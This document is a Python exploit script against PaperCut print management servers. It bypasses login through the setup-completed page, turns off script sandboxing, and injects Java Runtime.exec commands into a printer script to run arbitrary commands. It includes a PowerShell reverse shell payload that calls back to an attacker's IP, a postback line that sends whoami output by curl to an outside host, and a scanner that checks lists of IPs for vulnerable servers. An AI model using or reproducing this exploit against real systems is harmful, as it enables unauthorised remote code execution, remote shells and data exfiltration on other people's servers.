#!/usr/bin/python3
import argparse
import requests
import re

class PapercutExploit:
    def __init__(self, base_url=None, file_path=None):
        self.base_url = base_url
        self.file_path = file_path

    def check_file(self, filename):
        vulnerable_ips = []
        with open(filename, 'r') as f:
            for ip in f:
                ip = ip.strip()
                print(f'[*] Testing {ip}...')
                try:
                    response = requests.get(f'http://{ip}/app?service=page/SetupCompleted', verify=False, timeout=5)
                    if response.status_code == 200 and re.search(r"<span>\d+\.\d+\.\d+</span>", response.text.strip()):
                        print(f'[+] {ip} is vulnerable!')
                        vulnerable_ips.append(ip)
                except:
                    print(f'Error: {ip} is not responding or timed out')
        if vulnerable_ips:
            print('\nVulnerable IPs:')
            print('\n'.join(vulnerable_ips))
        else:
            print('No vulnerable IPs found')

    def get_session_id(self):
        s = requests.Session()
        r = s.get(f'{self.base_url}/app?service=page/SetupCompleted', verify=False)

        headers = {'Origin': f'{self.base_url}'}
        data = {
            'service': 'direct/1/SetupCompleted/$Form',
            'sp': 'S0',
            'Form0': '$Hidden,analyticsEnabled,$Submit',
            '$Hidden': 'true',
            '$Submit': 'Login'
        }
        r = s.post(f'{self.base_url}/app', data=data, headers=headers, verify=False)
        if r.status_code == 200 and b'papercut' in r.content and 'JSESSIONID' in r.headers.get('Set-Cookie', ''):
            print(f'[*] Papercut instance is vulnerable! Obtained valid JSESSIONID')
            return s
        else:
            print(f'[-] Failed to get valid response, likely not vulnerable')
            return None

    def set_setting(self, session, setting, enabled):
        print(f'[*] Updating {setting} to {enabled}')
        headers = {'Origin': f'{self.base_url}'}
        data = {
            'service': 'direct/1/ConfigEditor/quickFindForm',
            'sp': 'S0',
            'Form0': '$TextField,doQuickFind,clear',
            '$TextField': setting,
            'doQuickFind': 'Go'
        }
        r = session.post(f'{self.base_url}/app', data=data, headers=headers, verify=False)

        data = {
            'service': 'direct/1/ConfigEditor/$Form',
            'sp': 'S1',
            'Form1': '$TextField$0,$Submit,$Submit$0',
            '$TextField$0': enabled,
            '$Submit': 'Update'
        }
        r = session.post(f'{self.base_url}/app', data=data, headers=headers, verify=False)

    def execute(self, session, command):
        print('[*] Prepparing to execute...')
        postback = "java.lang.Runtime.getRuntime().exec('cmd.exe /C \"for /F \"usebackq delims=\" %A in (`whoami`) do curl http://10.0.40.83:8081/%A\"');"
        headers = {'Origin': f'{self.base_url}'}
        data = {
            'service': 'page/PrinterList'
        }
        r = session.get(f'{self.base_url}/app?service=page/PrinterList', data=data, headers=headers, verify=False)

        data = {
            'service': 'direct/1/PrinterList/selectPrinter',
            'sp': 'l1001'
        }
        r = session.get(f'{self.base_url}/app?service=direct/1/PrinterList/selectPrinter&sp=l1001', data=data, headers=headers, verify=False)

        data = {
            'service': 'direct/1/PrinterDetails/printerOptionsTab.tab',
            'sp': '4'
        }
        r = session.get(f'{self.base_url}/app', data=data, headers=headers, verify=False)

        data = {
            'service': 'direct/1/PrinterDetails/$PrinterDetailsScript.$Form',
            'sp': 'S0',
            'Form0': 'printerId,enablePrintScript,scriptBody,$Submit,$Submit$0,$Submit$1',
            'printerId': 'l1001',
            'enablePrintScript': 'on',
            'scriptBody': "function printJobHook(inputs, actions) {}\r\n" \
                         f"java.lang.Runtime.getRuntime().exec('{command}');",
            '$Submit$1': 'Apply',
        }
        r = session.post(f'{self.base_url}/app', data=data, headers=headers, verify=False)
        if r.status_code == 200 and 'Saved successfully' in r.text:
            print('[+] Executed successfully!')
        else:
            print('[-] Might not have a printer configured. Exploit manually by adding one.')
    
    def exploit(self, command=None, reverse_shell=False):
        sess = self.get_session_id()
        if sess:
            self.set_setting(sess, setting='print-and-device.script.enabled', enabled='Y')
            self.set_setting(sess, setting='print.script.sandboxed', enabled='N')
            if reverse_shell:
                ip = input("Enter your IP address: ")
                port = input("Enter your port number: ")
                command = f"cmd.exe /c powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}', {port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([byte[]][char[]]$sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
            elif not command:
                print("Error: either --reverse-shell or -c must be specified")
                return
            self.execute(sess, command)
            self.set_setting(sess, setting='print-and-device.script.enabled', enabled='N')
            self.set_setting(sess, setting='print.script.sandboxed', enabled='Y')

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', help='The URL of the Papercut target application', required=True)
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-c', '--command', help='The command to execute')
    group.add_argument('--reverse-shell', help='Use a reverse shell payload', action='store_true')
    group.add_argument('-f', '--file', help='File containing a list of IPs to check')
    args = parser.parse_args()
    
    if args.file:
        exploit = PapercutExploit()
        exploit.check_file(args.file)
    else:
        exploit = PapercutExploit(args.url)
        exploit.exploit(args.command, args.reverse_shell)